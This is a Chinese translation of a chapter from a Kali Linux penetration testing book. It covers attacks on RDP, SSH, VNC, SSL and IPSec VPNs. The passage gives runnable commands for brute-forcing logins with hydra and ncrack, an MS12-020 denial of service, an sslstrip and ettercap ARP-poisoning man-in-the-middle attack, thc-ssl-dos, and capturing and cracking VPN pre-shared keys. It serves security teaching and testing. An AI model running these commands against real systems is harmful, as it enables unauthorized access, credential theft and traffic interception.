# 精通 Kali Linux 高级渗透测试（三）

> 原文：[`annas-archive.org/md5/2DEEA011D658BEAFD40C40F1FA9AC488`](https://annas-archive.org/md5/2DEEA011D658BEAFD40C40F1FA9AC488)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十章：利用远程访问通信

在第九章中，*基于 Web 的应用程序的侦察和利用*，我们对基于 Web 的应用程序应用了杀伤链方法。我们审查了侦察、漏洞扫描和利用方法，这些方法特别适用于网站和其他应用程序。我们还审查了评估基于 Web 的应用程序所需的独特工具，特别是客户端代理和后期利用工具，如 Web shell。

在本章中，我们将重点放在破坏互联网上已经广泛传播的设备和应用程序的远程访问通信上。

攻击者正在利用远程访问通信的普遍性来实现以下目标：

+   利用现有的通信渠道直接远程访问目标系统

+   拦截通信

+   拒绝经过身份验证的用户访问常规通信，并强迫他们使用可能容易受到其他攻击的不安全通道

由于大多数用户认为他们正在使用“安全”的通信工具（甚至银行依赖 SSL 协议来保护在线银行业务），这些攻击可能对被攻击的通信以及受害者对其他在线通信的信任产生重大影响。

本章将重点放在侦察和利用杀伤链的阶段，因为它们与远程访问通信有关。它不涵盖诸如战争拨号、VoIP 和相关电话问题、高度专有的系统（如专门的亭台）以及值得拥有自己的书籍的复杂应用程序。

在本章结束时，您将学到以下内容：

+   利用操作系统通信协议（RDP 和 SSH）

+   利用远程访问应用程序（VNC）

+   配置 Kali 进行安全套接层 v2 扫描

+   对安全套接层进行侦察和利用，包括中间人和拒绝服务攻击。

+   攻击虚拟专用网络

# 利用操作系统通信协议

一些协议以明文传输访问凭据（Telnet 和 FTP）。使用诸如 Wireshark 之类的数据包嗅探器将允许攻击者拦截和重用凭据。

然而，大多数远程访问协议，尤其是嵌入在操作系统中的协议，现在都受到访问控制和加密的保护。尽管这增加了一定程度的安全性，但它们仍然容易受到由于配置错误或使用较差的加密密钥而导致的攻击。在本节中，我们将研究其他可能被利用来破坏所谓安全通信渠道的风险。

## 破坏远程桌面协议

**远程桌面协议**（**RDP**）是微软的专有通信协议，允许客户端使用图形界面连接到另一台计算机。尽管该协议是加密的，但如果攻击者猜到用户名和密码，就可以访问服务器。

### 注意

应该注意到，最常见的破坏 RDP 的方法是利用社交工程。用户被远程服务技术人员联系，说服用户需要远程访问以修复用户系统上的问题。针对 RDP 协议的恶意软件攻击也越来越普遍。

从测试人员（或攻击者）的角度来看，破坏目标的 RDP 服务的第一步是找到 RDP 服务器并确定所使用的加密强度。通常使用`nmap`等工具进行侦察，配置为扫描标准 RDP 端口 3389。

`nmap`工具现在包括专门的脚本，提供有关 RDP 的其他详细信息，包括加密配置。如果时间允许，且隐蔽性不是问题，应在初始扫描阶段使用这些脚本。调用枚举支持的加密协议的脚本的命令行如下：

```
root@kali:~# nmap – p 3389 –-script rdp-enum-encryption <IP>

```

上一个命令的执行结果如下截图所示：

![破坏远程桌面协议](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_01.jpg)

已经发现了一些 RDP 漏洞（尤其是 MS12-020），可以利用精心制作的数据包远程利用这些漏洞。

要确定当前版本的 RDP 是否存在漏洞，请使用适当的`nmap`脚本，通过调用以下命令行来执行：

```
root@kali:~# nmap –sV -p 3389 --script rdp-vuln-ms12-020 
  < IP> 

```

上一个命令的执行结果如下截图所示：

![Compromising Remote Desktop Protocol](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_02.jpg)

一旦使用`nmap`识别出一个易受攻击的系统，就可以利用 Metasploit Framework 的`auxiliary/dos/windows/rdp/ms12_020_maxchannelids`模块来造成拒绝服务。

RDP 最常见的破解方法是使用基于最常见用户名和密码字典的暴力攻击（也可以使用诸如**CeWL**和**crunch**之类的工具构建特定目标的字典，使用这些字典的暴力攻击比使用通用字典的尝试更快，并且更隐蔽，因为它们生成的网络流量更少）。

Kali 提供了几个工具来暴力破解访问，包括**hydra**、**medusa**、**ncrack**和**patator**。通过测试，我们发现`ncrack`在速度和效果方面是最可靠的。

### 提示

常见用户名和密码列表可以从多个来源获取。大多数破解工具，特别是`hydra`、`ncrack`和`john`（John the Ripper），都在应用程序的主目录中包含列表。测试人员还可以从在线来源下载各种类型的列表。从受损用户帐户派生的列表特别有用，因为它们反映了认证信息的真实世界使用情况。无论您使用哪个列表，您可能希望通过添加当前和以前员工的姓名（用于用户名）或使用诸如 CeWL 之类的工具创建的单词列表来个性化测试。

`ncrack`工具是一个高速身份验证破解工具，支持 FTP、HTTP(S)、POP3、RDP、SMB、SSH、Telnet 和 VNC 协议。可以使用以下命令从终端窗口调用它：

```
root@kali:~# ncrack -vv -U user.lst -P password.list
  <Taget IP>:<Target Port> 

```

上述命令的执行如下截图所示：

![Compromising Remote Desktop Protocol](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_03.jpg)

`ncrack`工具在大约 1700 秒内发现了所有用户的访问凭据。但所需的时间取决于使用的字典的总体大小以及在成功命中之前必须进行多少次猜测。

## 破解安全外壳

**安全外壳**（**SSH**）协议是一种网络协议，用于在服务器和客户端之间的开放网络上建立加密通道。一般来说，公钥-私钥对允许用户登录系统而无需密码。公钥存在于所有需要安全连接的系统上，而用户保留私钥。认证是基于私钥的；SSH 会验证私钥与公钥。在目标系统上，公钥会与允许远程访问系统的授权密钥列表进行验证。当公钥不具有密码学强度并且可以被猜测时，这种被认为是安全的通信渠道会失败。

与 RDP 一样，SSH 容易受到猜测用户访问凭据的暴力攻击。在这个特定的例子中，我们将使用一个名为`hydra`的工具。`hydra`工具可能是最古老的暴力攻击工具，绝对是功能最丰富的工具。它还支持对最多目标协议的攻击。

`hydra`工具可以在**Kali Linux** | **密码攻击** | **在线攻击**中找到，也可以直接从命令行调用。有两个版本的`hydra`：命令行版本（`hydra`）和 GUI 版本（hydra-gtk）。在这个例子中，我们将使用以下命令从命令行调用`hydra`：

```
root@kali:~# hydra -s 22 -v -V -L <file path/name>
  -P <file path/name> -t 8 <Target IP><protocol> 

```

命令参数如下列表所述：

+   `-s`指定要使用的端口。虽然在打算使用默认端口时不需要输入它，但在这种情况下使用它可以消除歧义并加快测试速度。

+   `-v`和`-V`选择报告的最大详细程度。

+   `-L`选择登录或用户名文件。

+   `-P`选择密码文件。

+   `-t`选择并行任务或连接的数量。数字越大，测试速度越快。但是，如果数字太大，可能会引入错误，并且会错过正确的密码。

以下屏幕截图显示了初始暴力攻击的详细输出：

![妥协安全外壳](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_04.jpg)

当使用字典成功登录时，`hydra`报告端口、协议、主机和登录凭据。然后它继续使用字典来识别其他可能的帐户。在以下截图的最顶部行中，Hydra 正确识别了一个具有`DigitalDefence`作为`login`和`darkstar`作为`password`的 SSH 帐户；截图还显示了 Hydra 尝试识别其他帐户的其他尝试。

![妥协安全外壳](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_05.jpg)

如果您知道密码配置，还可以使用`hydra`动态创建密码列表，使用以下命令：

```
root@kali:~# hydra –L user.lst –V –x 6:8:aA1 <IP address> SSH

```

上一个命令中使用的参数在以下列表中描述：

+   `-x`指示 Hydra 自动创建用于暴力攻击的密码。密码将根据`-x`后面的参数创建。

+   `6:8`表示密码长度的最小值为六个字符，最大值为八个字符。

+   `aA1`将自动创建使用字母和数字的密码组合。它将使用所有小写字母（由`a`表示）和所有大写字母（由`A`表示），以及数字 0 到 9（由`1`表示）。

您还可以向生成的列表中添加特殊字符，但是需要在`-x`选项周围添加单引号，如下命令所示：

```
root@kali:~# -L user.lst –V –x '6:8:aA1 !@#$' <IP address> SSH

```

# 利用第三方远程访问应用程序

绕过系统协议以提供远程访问的应用程序曾经非常流行。尽管它们目前正在被在线服务如**GoToMyPC**和**LogMeIn**所取代，但它们仍然很常见。此类程序的示例包括 pcAnywhere 和 VNC。

这些工具的实例可能存在于网络上，因为系统管理员的合法操作。然而，它们也可能存在是因为网络已经被入侵，攻击者想要一种远程访问网络的手段。

在以下示例中，我们将使用 Metasploit 框架的内置功能来妥协 VNC。

1.  使用`nmap`在目标上找到远程访问软件。如下截图所示，VNC 通常在 TCP 端口`5900`上找到。![利用第三方远程访问应用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_06.jpg)

1.  使用终端窗口中的`msfconsole`命令激活 Metasploit 框架。从`msf`提示符，配置它以妥协 VNC，如下截图所示：![利用第三方远程访问应用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_07.jpg)

1.  启动`run`命令，如下截图所示，并观察成功运行：![利用第三方远程访问应用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_08.jpg)

1.  最后，一旦 Metasploit 确定了凭据，通过使用`vncviewer`登录到 VNC 客户端验证它们。从终端窗口的命令提示符中，输入以下内容：

```
root@kali:~# vncviewer <Target IP>

```

这将连接到远程主机并提示您输入适当的凭据。当认证成功时，将打开一个新窗口，让您远程访问目标系统。通过发出`whoami`查询验证您是否在目标系统上，如下截图所示，并请求系统的 ID 或 IP 地址：

![利用第三方远程访问应用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_09.jpg)

# 攻击安全套接字层

**安全套接字层**（**SSL**）及其后继者**传输层安全**（**TLS**）是用于在互联网上提供安全通信的加密协议。这些协议已被广泛用于安全应用，如互联网消息传递和电子邮件、网页浏览和 IP 语音。

这些协议在互联网上无处不在，然而，它们起源于上世纪 90 年代中期，并且随着年龄的增长，它们越来越受到攻击。SSL 2.0 版本（1.0 版本从未公开发布）包含大量可以被利用的缺陷，如密钥控制不当和中间人攻击的弱点。尽管大多数用户已经实现了该协议的 3.0 版本或更新版本的 TLS，但配置错误的系统可能仍然允许使用较早的不安全版本。

## 配置 Kali 进行 SSLv2 扫描

在开始侦察阶段之前，请验证 Kali 是否已配置为扫描 SSL 版本 2 协议。在撰写本书时，情况并非如此。

从终端窗口输入以下命令：

```
root@kali:~# openssl_s_client -connect 
  www.opensecurityresearch.com:443 -ssl2 

```

如果返回`unknown option -ssl2`错误（如下面的屏幕截图所示），则需要进行额外的配置。

![配置 Kali 进行 SSLv2 扫描](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_10.jpg)

要应用修复，您必须使用以下步骤重新对 OpenSSL 应用程序进行打补丁（确保使用的路径反映了下载目录的使用）：

1.  使用以下命令安装**quilt**，这是一个用于管理应用程序源代码的多个补丁的程序：

```
root@kali:~# apt-get install devscripts quilt

```

1.  下载`openssl`源代码，验证已应用的补丁，更新配置文件，然后重新构建应用程序。使用以下命令：

```
root@kali:~# apt-get source openssl
root@kali:~# cd openssl-1.0.1e
root@kali:~/openssl-1.0.1e# quilt pop -a

```

1.  编辑`openssl-1.0.1e/debian/patches/series`文件，删除文件中的以下行：

```
ssltest_no_sslv2.patch

```

1.  编辑`openssl-1.0.1e/debian/rules`文件，删除`no-ssl2`参数。然后，重新应用`openssl`的补丁。使用以下命令：

```
root@kali:~/openssl-1.0.1e# quilt push -a
root@kali:~/openssl-1.0.1e#  dch -n 'Allow SSLv2'

```

1.  完成后，重新构建`openssl`软件包，然后重新安装。可以使用以下命令执行此步骤：

```
root@kali:~/openssl-1.0.1e# dpkg-source  --commit
root@kali:~/openssl-1.0.1e# debuild -uc -us
root@kali:~/openssl-1.0.1e# cd /root
root@kali:~# dpkg -i *ssl*.deb

```

1.  确认已成功应用补丁，重新发出使用 SSLv2 连接的命令，如下面的屏幕截图所示：![配置 Kali 进行 SSLv2 扫描](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_11.jpg)

依赖于`openssl`的 Kali 脚本，特别是`sslscan`，将需要重新编译。要重新编译，首先下载源代码，然后重新构建。完成后，使用以下命令重新安装：

```
root@kali:~# apt-get source sslscan
root@kali:~# cd sslscan-1.8.2
root@kali:~/sslscan-1.8.2# debuild -uc -us
root@kali:~/sslscan-1.8.2# cd /root
rootl@kali:~# dpkg -i *sslscan*.deb

```

Kali 对 SSLv2 的问题可能在将来的版本中得到解决，因此，在测试 SSL 连接之前，请先验证这一点。

## SSL 连接的侦察

在评估 SSL 连接时，侦察阶段仍然很重要，特别是在审查以下项目时：

+   用于识别建立安全 SSL 连接的各方的**x.509**证书

+   正在使用的加密类型

+   配置信息，例如是否允许 SSL 会话的自动重新协商

SSL 证书可以提供可能用于促进社会工程的信息。

更频繁地，测试人员或攻击者想要确定证书是否有效。无效的证书可能是由于检查签名时出现错误、证书链断裂、证书中指定的域与系统不匹配，或者证书已过期、被吊销或已知已被 compromise。

如果用户之前接受了无效证书，他们很可能会接受新的无效证书，这会使攻击者的工作变得更加容易。

用于保护 SSL 连接的加密类型尤为重要。加密密码分为以下几类：

+   **空密码**: 这些密码用于验证传输的真实性和/或完整性。因为没有应用加密，它们不提供任何安全性。

+   **弱密码**: 这是一个用来描述所有密钥长度为 128 位或更少的密码的术语。使用**Diffie-Hellman 算法**进行密钥交换的密码也可能被认为是弱的，因为它们容易受到中间人攻击的影响。由于碰撞攻击，MD5 哈希的使用也可能被认为是弱的。最近对 RC4 的攻击也对其持续使用提出了质疑。

+   **强密码**: 这些是超过 128 位的密码。目前，接受的最安全选项是具有 256 位密钥的 AES 加密。如果可能的话，应该与 Galois/Counter 模式一起使用，这是一种现代的块密码，支持认证和加密。

SSL 和 TLS 依赖于密码套件（特定的身份验证、加密和消息认证码算法的组合）来为每个连接建立安全设置。有 30 多种这样的套件，为了满足每个安全需求而选择最佳选项的复杂性经常导致用户默认选择不太安全的选项。因此，每个 SSL 和 TLC 连接都必须经过彻底测试。

要对 SSL 连接进行侦察，使用`nmap`或 SSL 特定应用的 NSE 模块。`nmap` NSE 模块在下表中描述。

| Nmap NSE 模块 | 模块功能 |
| --- | --- |
| `ssl-cert` | 检索服务器的 SSL 证书。返回的信息量取决于详细级别（无，`-v`和`-vv`）。 |
| `ssl-date` | 从其 TLS ServerHello 响应中检索目标主机的日期和时间。 |
| `ssl-enum-ciphers` | 反复发起 SSL 和 TLS 连接，每次尝试一个新的密码，并记录主机是否接受或拒绝它。密码显示具有强度评级。这是一种高度侵入性的扫描，可能会被目标阻止。 |
| `ssl-google-cert-catalog` | 查询谷歌的证书目录，以获取与从目标检索的 SSL 证书相关的信息。它提供了谷歌对证书的认识时间和持续时间。如果证书未被谷歌认可，可能是可疑/虚假的。 |
| `ssl-known-key` | 检查主机使用的 SSL 证书是否具有与已知的受损或有缺陷的密钥数据库匹配的指纹。目前，它使用 LittleBlackBox 数据库。但是，可以使用任何指纹数据库。 |
| `sslv2` | 确定服务器是否支持已过时且不太安全的 SSL 版本 2，以及支持哪些密码。 |

要从命令行调用单个脚本，请使用以下命令：

```
root@kali:~# nmap --script <script name> -p 443 <Target IP>

```

在以下示例中，使用`-vv`选项调用了`ssl-cert`脚本以获得最大详细信息。来自此脚本的数据显示在以下截图中：

![SSL 连接的侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_12.jpg)

在侦察期间，测试人员可以选择使用以下命令启动所有 SLL 特定模块：

```
root@kali:~# nmap --script "ssl*" <IP address>

```

Kali 专用于 SSL 和 TLS 的侦察和攻击工具可以从命令行调用，也可以通过导航到**Kali Linux** | **信息收集** | **SSL 分析**菜单中选择。这些工具在下表中总结：

| 工具 | 功能 |
| --- | --- |
| `sslcaudit` | 自动化测试 SSL 和 TLS 客户端，以确定其抵抗中间人攻击的能力。 |
| `ssldump` | 对 SSLv3 和 TLS 通信进行网络协议分析。如果提供了适当的加密密钥，它将解密 SSL 流量并以明文显示。 |
| `sslscan` | 查询 SSL 服务以确定支持哪些密码。输出包括首选的 SSL 密码，并以文本和 XML 格式显示。 |
| `sslsniff` | 在特定局域网上对所有 SSL 连接启用中间人攻击条件，动态为正在访问的域生成证书。 |
| `sslsplit` | 对 SSL 和 TLS 网络执行中间人攻击。连接通过网络地址转换引擎透明拦截并重定向到`sslsplit`，终止原始连接并启动到原始目的地的新连接，同时记录所有传输的数据。它支持纯 TCP、SSL、HTTP/HTTPs 以及 IPv4 和 IPv6。 |
| `sslstrip` | 旨在透明地劫持网络上的 HTTP 流量，监视 HTTPS 链接，并将这些链接重定向并映射为伪造的 HTTP 或 HTTPS 链接。它还支持提供一个看起来像锁图标的 favicon 以及拦截通信的选择性记录模式。 |
| `sslyze` | 分析服务器的 SSL 配置。 |
| `tlssled` | 统一了几个其他 SSL 特定应用程序的使用和输出，检查加密强度、证书参数和重新协商能力。 |

最常用的程序是`sslscan`，它查询 SSL 服务以确定证书详细信息和支持的密码。输出格式为文本和 XML。

在测试特定连接时，使用`--no-failed`选项，如下截图所示，让`sslscan`只显示已接受的密码套件。

![SSL 连接的侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_13.jpg)

`sslyze` python 工具分析服务器的 SSL 配置并验证证书，测试弱密码套件，并识别可能支持其他攻击的配置信息。在下面的截图中，它已经识别出可能支持某些攻击类型的证书不匹配。

![SSL 连接的侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_14.jpg)

另一个 SSL 侦察工具是`tlssled`，如下截图所示。它非常快速、操作简单，输出用户友好。

![SSL 连接的侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_15.jpg)

无论您使用何种方法进行 SSL 侦察，都要确保通过运行至少两种不同的工具来交叉验证您的结果。此外，并非所有配置了 SSL 的设备都会同时在线。因此，在大型网络上，在测试过程中多次扫描 SSL 漏洞。

### 提示

目前正在开发中的一个新工具是 OWASP 的 O-Saft ([www.owasp.org/index.php/O-Saft](http://www.owasp.org/index.php/O-Saft))，它提供了 SSL 配置、密码和证书数据的全面概述。

## 使用 sslstrip 进行中间人攻击

尽管 SSL 保护提供了安全性，但协议也存在一些有效的攻击。2009 年，Moxie Marlinspike 演示了`sslstrip`，这是一个透明地劫持网络上的 HTTP 流量，并将流量重定向为 HTTP 或 HTTPS 链接的工具。它去除了 SSL 保护，并将*安全*锁图标返回给受害者的浏览器，以便拦截不容易被检测到。

简而言之，`sslstrip`发起了对 SSL 的中间人攻击，允许先前受保护的数据被拦截。

要使用`sslstrip`，必须首先使用以下命令将拦截系统配置为转发模式：

```
root@kali:~# echo "1" > /proc/sys/net/ipv4/ip_forward

```

接下来，使用以下命令设置`iptables`防火墙，将 HTTP 流量重定向到`sslstrip`：

```
root@kali:~# iptables –t nat –A PREROUTING –p tcp
  –destination-port 80 –j REDIRECT –to-port <listenport> 

```

在这个例子中，监听端口已设置为端口 5353。

现在配置完成后，使用以下命令运行`sslstrip`：

```
root@kali:~# sslstrip –l 5353

```

以下截图显示了先前命令的执行情况：

![使用 sslstrip 进行中间人攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_16.jpg)

最小化执行`sslstrip`的活动终端窗口，并打开一个新的终端窗口。使用以下命令使用`ettercap`来欺骗 ARP 并将流量从网络或目标系统直接重定向到拦截系统：

```
root@kali:~# ettercap –TqM arp:remote /192.168.75.128/ /192.168.75.2/

```

在这里，`ettercap -T`开关选择文本界面，`-q`强制控制台进入安静模式，`-M`选项激活中间人攻击以劫持和重定向数据包。`arp:remote`开关实施 ARP 毒化攻击，并将攻击者置为中间人，能够查看和修改传输中的数据包。如果要查看远程 IP 地址和通过网关的通信，则需要`remote`部分的开关。

上面命令的执行结果如下截图所示：

![使用 sslstrip 进行中间人攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_17.jpg)

如果目标系统要访问 SSL 安全内容，他们的查询将通过网关定向到拦截系统。

从用户的角度来看，他们将被引导到该网站，并出现**该站点的安全证书存在问题**的安全警报，提示他们做出决定。如果他们选择**是**，他们将被引导到他们选择的页面。浏览器右下角的锁图标仍然表示 SSL 已启用，表明他们的通信是安全的。

在后台，`sslstrip`工具移除 SSL，留下原始内容，可以在`ettercap`日志中查看，如下截图所示：

![使用 sslstrip 进行中间人攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_18.jpg)

这种攻击只对相同的第二层网络段有效。然而，它在有线和无线网络上都能成功。虽然 ARP 重定向可以应用于网络段，但这种攻击会影响网络带宽，可能会被检测到。因此，最有效的方法是将这种攻击直接针对单个设备。

### 提示

要禁用 PREROUTING 规则，将`-A`替换为`-D`。要清除防火墙规则，使用`iptables -t nat -F`（清除命令）和`iptables -t nat -L`（验证表已被清除）。

## 针对 SSL 的拒绝服务攻击

建立 SSL 连接时，服务器必须完成一系列计算密集型的计算来启动握手并开始加密。这需要客户端进行少量的计算工作，服务器则需要更多的计算工作。

如果客户端发起 SSL 连接但拒绝服务器的响应，则 SSL 连接将不会建立。但是，如果 SSL 服务器配置为自动重新协商连接，则计算工作量将导致拒绝服务。

Kali Linux 有几个工具可以帮助您确定是否允许自动重新协商，包括`sslyze`和`tssled`。

如果允许自动重新协商，则输入以下命令将允许测试人员评估对拒绝服务攻击的抵抗力：

```
root@kali:~# thc-ssl- dos <IP address> <port>

```

上面命令的执行结果如下截图所示：

![针对 SSL 的拒绝服务攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_19.jpg)

# 攻击 IPSec 虚拟专用网络

**虚拟专用网络**（**VPN**）使用互联网在远程位置或同一网络内的用户之间提供安全（加密）通信。有两种类型的 VPN：**IPSec**和**SSL**。

IPSec 是建立网络之间安全连接和在虚拟专用网络中连接主机最常用的协议。

在 IPSec 中，有几个子协议执行特定功能，例如以下内容：

+   **认证头**（**AH**）：为 IP 数据包提供来源证明，保护它们免受重放攻击。

+   **封装安全协议**（**ESP**）：该协议提供传输数据的来源真实性、完整性和机密性。

+   **安全关联**：这是用于加密和验证传输数据的算法集。因为 SA 与单向数据传输相关联，双向通信由一对安全关联保护。安全关联使用**Internet 安全关联和密钥管理协议**（**ISAKMP**）建立，可以通过多种方式实现。在测试 VPN 的安全性时，最脆弱的配置之一依赖于预共享密钥，**Internet 密钥交换**（**IKE**）。

为了评估 VPN 的安全性，测试人员遵循以下基本步骤：

1.  扫描 VPN 网关的存在。

1.  指纹识别 VPN 网关以确定供应商和配置详细信息。

1.  寻找与 VPN 供应商或相关产品相关的漏洞。

1.  捕获预共享密钥。

1.  执行离线 PSK 破解。

1.  检查默认用户帐户。

## 扫描 VPN 网关

要扫描 VPN 网关的存在，使用`nmap`或`ike-scan`。要使用`nmap`，发出以下命令：

```
root@kali@:~# nmap -–sU -Pn –p 500 <IP Address>

```

在这个例子中，`-sU`指示`nmap`使用 UDP 数据包（而不是 TCP）扫描主机范围以寻找可能的目标，`-Pn`确保`nmap`不会发送 ping 扫描（这可能会警告目标有关扫描并识别测试人员），`-p 500`标识要扫描的特定端口。

`nmap`工具由于处理 IKE 数据包的方式而无法定位所有 VPN 网关；最有效的工具是向目标系统发送格式正确的 IKE 数据包并显示返回消息。

定位 VPN 网关的最佳工具是`ike-scan`（可以通过导航到**Kali Linux** | **信息收集** | **VPN 分析**找到）。`ike-scan`命令行工具使用 IKE 协议来发现和指纹私人网络。它还支持在 IKE 主动模式下破解预共享密钥。要使用`ike-scan`定位目标，发出以下命令：

```
root@kali@:~# ike-scan -M <Target IP>

```

以下屏幕截图显示了上一个命令的执行：

![扫描 VPN 网关](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_20.jpg)

`-M`开关将每个有效负载返回为一行，简化输出。

`ike-scan`工具针对目标设备测试各种转换。一个转换包含多个属性：加密算法（DES 和 3DES）、哈希算法（MD5 和 SHA1）、认证方法（预共享密钥）、Diffie-Hellman 组（选项一是 768 位，选项二是 1024 位）和生命周期（28,800 秒）。它将确定哪些转换引发了成功的响应。

完成对每个已识别设备的`ike-scan`后，程序将返回以下之一：

+   `0 个握手返回；0 个通知返回`：这表示目标不是 IPSec 网关

+   `0 个握手返回；1 个通知返回`：这表示虽然存在 VPN 网关，但`ike-scan`提供给它的转换都不可接受

+   `1 个握手返回；0 个通知返回`：如前面的屏幕截图所示，这表示目标已配置为 IPSec，并将对`ike-scan`提供的一个或多个转换执行 IKE 协商

## 指纹识别 VPN 网关

如果您可以与 VPN 网关建立握手，您可以对设备进行指纹识别，返回以下信息：

+   供应商和型号

+   软件版本

这些信息用于识别特定供应商的攻击或微调通用攻击。

### 注意

如果 VPN 由防火墙托管，指纹识别还将识别所使用的防火墙。

由于 IKE 不能保证传输数据包的可靠性，大多数 VPN 网关供应商使用专有协议来处理看似丢失的流量。`ike-scan`工具向 VPN 网关发送 IKE 探测数据包，但不会回复收到的响应。服务器会假装数据包已丢失，并实施其退避策略以重新发送数据包。通过分析数据包之间的时间差和重试次数，`ike-scan`可以识别供应商。

在下面的截图中显示的示例中，`-M`选项导致每个有效负载显示在单独的一行上，使输出更易于阅读。`ike-scan`的`-showbackoff`选项（如下面的截图所示）记录了发送和接收的所有数据包的响应时间，然后在显示结果之前记录了 60 秒的延迟。

![对 VPN 网关进行指纹识别](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_21.jpg)

在前面的截图中，**供应商 ID**（**VID**）是一个特定于供应商的 MD5 哈希文本字符串，用于识别专有通信或特定通信细节。

`ike-scan`工具还可用于确定网关是否支持主动模式。如果支持，很难与服务器建立握手，因为服务器不会响应，直到作为识别有效负载的一部分提供了有效的 ID。

## 捕获预共享密钥

`ike-scan`工具可用于将 VPN 网关推入主动模式。这很重要，因为 IPSec 的主动模式不保护预共享密钥。认证凭据以明文形式发送，可以被捕获，然后使用离线工具进行破解。

对 Cisco VPN 集中器发出的以下示例使用以下命令：

```
root@kali@:~# ike-scan --pskcrack --aggressive
--id=peer <target>

```

以下截图显示了先前命令的执行：

![捕获预共享密钥](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_22.jpg)

如果您希望将结果导出到文本文件以进行额外分析和离线密码破解，请使用以下命令：

```
root@kali@:~# ike-scan --pskcrack --aggressive
  --id=peer <target> > <path/psk.txt> 

```

## 执行离线 PSK 破解

在使用离线工具破解捕获的预共享密钥哈希之前，编辑输出文件以仅包含哈希值（应包含九个以冒号分隔的值）。破解密钥的最有效工具是`psk-crack`，它支持字典、暴力和混合模式破解。

![执行离线 PSK 破解](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_10_23.jpg)

与所有离线破解一样，成功取决于工作和付出的努力（时间、计算工作量和能源投入）。像前面截图中显示的那样，一个强大的预共享密钥将需要很长时间才能破解。

## 识别默认用户账户

与大多数其他硬件设备一样，VPN 网关通常在安装时包含默认用户帐户。这些可能不会被管理员更改。使用在指纹识别过程中收集的信息，测试人员可以进行网络搜索以识别标准用户帐户。

如果测试人员可以访问用户的计算机，用户名凭据通常以明文形式存储在系统注册表中。此外，如果测试人员可以访问系统的内存，就可以直接从客户系统的内存转储中获取密码。

### 提示

**VulnVPN**（[www.rebootuser.com](http://www.rebootuser.com)）是一个虚拟操作系统和易受攻击的 VPN 服务器。它允许您应用本章描述的工具来破坏应用程序并在不损坏生产系统的情况下获得 root 访问权限。

# 总结

在本章中，我们研究了如何利用常见的远程访问应用程序，包括已加密以提供额外安全性的应用程序。我们利用了操作系统通信协议（RDP 和 SSH）和应用程序，如 VNC。我们还学习了如何对安全套接字层连接和虚拟专用网络进行侦察，以及减少加密效果的攻击类型。

在下一章中，我们将看到针对特定通信渠道的联合攻击与针对人类的攻击的结果。在检验这些客户端利用的有效性时，我们将审查几种攻击类型以及**浏览器利用框架**（**BeEF**）项目。



# 第十一章：客户端利用

对于攻击者或有效的渗透测试人员来说，最大的挑战是绕过目标的安全控制以实现妥协。当针对位于网络上的系统时，这可能很困难，因为攻击者通常需要绕过防火墙、代理、入侵检测系统和防御深度架构的其他元素。

成功的绕过策略是直接针对客户端应用程序。用户启动与客户端应用程序的交互，使攻击者能够利用用户和应用程序之间已经存在的信任。社会工程方法的使用将增强客户端攻击的成功率。

客户端攻击针对的是通常缺乏安全控制（尤其是防火墙和入侵检测系统）的系统。如果这些攻击成功并建立了持久的通信，客户端设备可以在重新连接到目标网络时用于发动攻击。

在本章结束时，您将学会如何使用以下方法攻击客户端应用程序：

+   敌对脚本攻击（VBScript 和 PowerShell）

+   跨站脚本框架

+   浏览器利用框架

# 使用敌对脚本攻击系统

客户端脚本，如 JavaScript、VBScript 和 PowerShell，是为了将应用程序逻辑和操作从服务器移动到客户端计算机而开发的。从攻击者或测试者的角度来看，使用这些脚本有几个优点，如下所示：

+   它们已经是目标自然操作环境的一部分；攻击者不需要将大型编译器或其他辅助文件（如加密应用程序）传输到目标系统。

+   脚本语言旨在促进计算机操作，如配置管理和系统管理。例如，它们可以用于发现和更改系统配置、访问注册表、执行程序、访问网络服务和数据库，以及通过 HTTP 或电子邮件传输二进制文件。这些标准的脚本操作可以很容易地被测试人员采用使用。

+   由于它们是操作系统环境的一部分，它们通常不会触发防病毒警报。

